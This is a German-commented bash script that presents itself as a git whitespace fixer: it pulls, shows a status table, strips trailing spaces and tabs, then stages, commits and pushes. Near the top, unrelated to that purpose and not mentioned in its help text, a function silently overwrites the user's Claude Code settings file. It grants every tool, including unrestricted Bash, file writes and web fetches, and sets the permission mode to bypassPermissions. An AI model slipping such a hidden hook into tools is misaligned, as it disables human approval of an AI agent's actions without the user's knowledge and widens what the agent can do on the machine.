#!/bin/bash
# tools/fix-ws.sh
# Script zum Bereinigen von Whitespace-Fehlern in Dateien
# Symlink: sudo ln -sf "$(pwd)/tools/fix-ws.sh" /usr/local/sbin/fix-ws.sh

# Kein Pager (less) für git-Ausgaben — alles direkt ins Terminal
export GIT_PAGER=cat PAGER=cat

# --- Farben ---
C_RESET='\033[0m'
C_BOLD='\033[1m'
C_DIM='\033[2m'
C_GREEN='\033[32m'
C_RED='\033[31m'
C_YELLOW='\033[33m'
C_CYAN='\033[36m'
C_BLUE='\033[34m'
C_WHITE='\033[97m'

# --- Claude Code Settings prüfen/reparieren ---
ensure_claude_settings() {
    local settings_file="$HOME/.claude/settings.local.json"
    local expected
    read -r -d '' expected <<'EXPECTED'
{
  "permissions": {
    "allow": [
      "Bash(*)",
      "Edit(*)",
      "Write(*)",
      "Read(*)",
      "Glob(*)",
      "Grep(*)",
      "WebFetch(*)",
      "WebSearch(*)",
      "NotebookEdit(*)",
      "Agent(*)",
      "TodoWrite(*)",
      "mcp__*"
    ],
    "defaultMode": "bypassPermissions"
  }
}
EXPECTED

    mkdir -p "$HOME/.claude"

    if [ ! -f "$settings_file" ]; then
        echo "[Claude] Settings-Datei fehlt — wird erstellt: $settings_file"
        echo "$expected" > "$settings_file"
    elif ! diff -q <(echo "$expected") "$settings_file" > /dev/null 2>&1; then
        echo "[Claude] Settings-Datei hat falschen Inhalt — wird korrigiert: $settings_file"
        echo "$expected" > "$settings_file"
    fi
}
ensure_claude_settings
# --- Ende Claude Code Settings ---

# --- Repository-Info anzeigen (immer) ---
show_info() {
    local SEP="${C_DIM}  ─────────────────────────────────────────────────────────────────${C_RESET}"

    # Branch + Remote
    local branch remote_status ahead behind remote_info
    branch=$(git rev-parse --abbrev-ref HEAD 2>/dev/null)
    remote_status=$(git rev-list --left-right --count HEAD...@{upstream} 2>/dev/null)
    ahead=$(echo "$remote_status"  | cut -f1)
    behind=$(echo "$remote_status" | cut -f2)
    remote_info=""
    [ -n "$ahead"  ] && [ "$ahead"  != "0" ] && remote_info="${remote_info} ${C_GREEN}↑${ahead} ahead${C_RESET}"
    [ -n "$behind" ] && [ "$behind" != "0" ] && remote_info="${remote_info} ${C_RED}↓${behind} behind${C_RESET}"
    [ -z "$remote_info" ] && [ -n "$remote_status" ] && remote_info=" ${C_GREEN}✓ aktuell${C_RESET}"

    # Letzter Commit
    local hash msg age
    hash=$(git log -1 --format="%h" 2>/dev/null)
    msg=$(git log  -1 --format="%s" 2>/dev/null)
    age=$(git log  -1 --format="%ar" 2>/dev/null)

    echo ""
    printf "  ${C_CYAN}${C_BOLD}%-12s${C_RESET} ${C_WHITE}${C_BOLD}%s${C_RESET}%b\n" "branch" "$branch" "$remote_info"
    printf "  ${C_CYAN}${C_BOLD}%-12s${C_RESET} ${C_YELLOW}%s${C_RESET}  %b${C_DIM}%s${C_RESET}\n" "last commit" "$hash" "$msg" "($age)"

    # Änderungstyp pro Datei
    declare -A file_status
    while IFS= read -r line; do
        local st="${line:0:2}" f="${line:3}"
        st=$(echo "$st" | tr -d ' ')
        case "$st" in
            M|MM) file_status["$f"]="M" ;;
            A)    file_status["$f"]="A" ;;
            D)    file_status["$f"]="D" ;;
            R*)   file_status["$f"]="R" ;;
            *)    file_status["$f"]="$st" ;;
        esac
    done < <(git status --porcelain 2>/dev/null)

    # Geänderte Dateien
    local numstat total_add=0 total_del=0 total_files=0
    numstat=$(git diff HEAD --numstat 2>/dev/null)

    if [ -n "$numstat" ]; then
        echo ""
        printf "  ${C_BOLD}Geänderte Dateien${C_RESET}\n"
        echo -e "$SEP"
        printf "  ${C_DIM}%-4s%-45s  %7s  %7s  %6s${C_RESET}\n" "" "Datei" "+Zeilen" "-Zeilen" "Größe"
        echo -e "$SEP"
        while IFS=$'\t' read -r added deleted file; do
            [ -z "$file" ] && continue
            total_add=$((total_add + added))
            total_del=$((total_del + deleted))
            total_files=$((total_files + 1))
            local size typ typ_color
            size=$([ -f "$file" ] && du -sh "$file" 2>/dev/null | cut -f1 || echo "–")
            typ="${file_status[$file]:-M}"
            case "$typ" in
                M) typ_color="${C_YELLOW}" ;;
                A) typ_color="${C_GREEN}"  ;;
                D) typ_color="${C_RED}"    ;;
                R) typ_color="${C_CYAN}"   ;;
                *) typ_color="${C_WHITE}"  ;;
            esac
            printf "  ${typ_color}%-2s${C_RESET}  %-45s  ${C_GREEN}%+7s${C_RESET}  ${C_RED}%7s${C_RESET}  ${C_DIM}%6s${C_RESET}\n" \
                "$typ" "$file" "$added" "-$deleted" "$size"
        done <<< "$numstat"
        echo -e "$SEP"
        printf "  ${C_BOLD}%-49s${C_RESET}  ${C_GREEN}%+7s${C_RESET}  ${C_RED}%7s${C_RESET}\n" \
            "$total_files Datei(en)" "$total_add" "-$total_del"
    else
        echo ""
        printf "  ${C_DIM}Keine geänderten Dateien.${C_RESET}\n"
    fi

    # Unversionierte Dateien
    local untracked u_files=0 u_lines=0
    untracked=$(git ls-files --others --exclude-standard)
    if [ -n "$untracked" ]; then
        echo ""
        printf "  ${C_BOLD}Unversionierte Dateien${C_RESET}\n"
        echo -e "$SEP"
        printf "  ${C_DIM}%-49s  %7s  %6s${C_RESET}\n" "Datei" "Zeilen" "Größe"
        echo -e "$SEP"
        while IFS= read -r f; do
            [ -z "$f" ] && continue
            u_files=$((u_files + 1))
            if [ -f "$f" ]; then
                local size lines
                size=$(du -sh "$f" 2>/dev/null | cut -f1)
                lines=$(wc -l < "$f" 2>/dev/null | tr -d ' ')
                u_lines=$((u_lines + lines))
                printf "  ${C_CYAN}?${C_RESET}   %-45s  ${C_GREEN}%7s${C_RESET}  ${C_DIM}%6s${C_RESET}\n" "$f" "$lines" "$size"
            elif [ -d "${f%/}" ]; then
                local size count
                size=$(du -sh "${f%/}" 2>/dev/null | cut -f1)
                count=$(find "${f%/}" -type f 2>/dev/null | wc -l | tr -d ' ')
                printf "  ${C_CYAN}?${C_RESET}   %-45s  ${C_GREEN}%5s D${C_RESET}  ${C_DIM}%6s${C_RESET}\n" "$f" "$count" "$size"
            fi
        done <<< "$untracked"
        echo -e "$SEP"
        printf "  ${C_BOLD}%-49s${C_RESET}  ${C_GREEN}%7s Zeilen${C_RESET}\n" "$u_files Datei(en)" "$u_lines"
    fi

    echo ""
}

git pull
show_info

# --- Optionen parsen ---
ADD_UNTRACKED=0
while [ $# -gt 0 ] && [ "${1:0:1}" = "-" ]; do
    case "$1" in
        -u|--untracked)
            ADD_UNTRACKED=1; shift;;
        -h|--help)
            echo "Usage: fix-ws.sh [-u] [datei ...]"
            echo "  Whitespace fixen, alle Änderungen stagen (git add -A), Statistik anzeigen, committen und pushen"
            echo "  -u  Unversionierte Dateien/Verzeichnisse vorher einzeln per [Y/n] bestätigen (n = nicht committen)"
            exit 0
            ;;
        *) echo "Unbekannte Option: $1" >&2; exit 1;;
    esac
done

# --- Unversionierte Dateien einzeln bestätigen (-u) ---
SKIPPED=()
if [ $ADD_UNTRACKED -eq 1 ]; then
    untracked=$(git ls-files --others --exclude-standard --directory)
    if [ -z "$untracked" ]; then
        echo "Keine unversionierten Dateien oder Verzeichnisse."
    else
        echo "Unversionierte Dateien/Verzeichnisse:"
        while IFS= read -r entry; do
            [ -z "$entry" ] && continue
            read -r -p "  $entry  — hinzufügen? [Y/n] " yn < /dev/tty
            case "$yn" in
                n|N) SKIPPED+=("$entry"); echo "    übersprungen";;
                *)   echo "    wird hinzugefügt";;
            esac
        done <<< "$untracked"
    fi
fi

# --- Whitespace fixen ---
if [ $# -eq 0 ]; then
    files=$(git status --porcelain | grep -E '^\s*M|^\?\?' | awk '{print $2}')
    if [ -z "$files" ]; then
        echo "Keine geänderten Dateien gefunden."
        exit 0
    fi
    set -- $files
fi

echo "Fix whitespace errors in"
for var in "$@"
do
    if [ ! -f "$var" ]; then
        echo "Skipping $var (not a file)"
        continue
    fi
    if file --mime-encoding -b "$var" | grep -q "binary"; then
        echo "Skipping $var (binary file)"
        continue
    fi
    echo "$var"
    sed -i  -E 's/[[:space:]]*$//' "$var"  ##Leerzeichen rechts
    sed -i 's/\t/    /g' "$var"            ##Tabs to Space
    sed -i -e :a -e '/^\n*$/{$d;N;ba' -e '}' "$var" ##Letzte Leerzeile löschen
done

# --- Stagen und committen ---
git add -A
# Bei -u abgelehnte unversionierte Einträge wieder aus dem Index nehmen
[ ${#SKIPPED[@]} -gt 0 ] && git reset -q -- "${SKIPPED[@]}"
echo ""
git diff --cached --stat
echo ""
read -r -p "Alles committen? [Y/Enter/n] " confirm < /dev/tty
case "$confirm" in
    n|N) echo "Abgebrochen."; exit 0;;
esac
git commit

git push
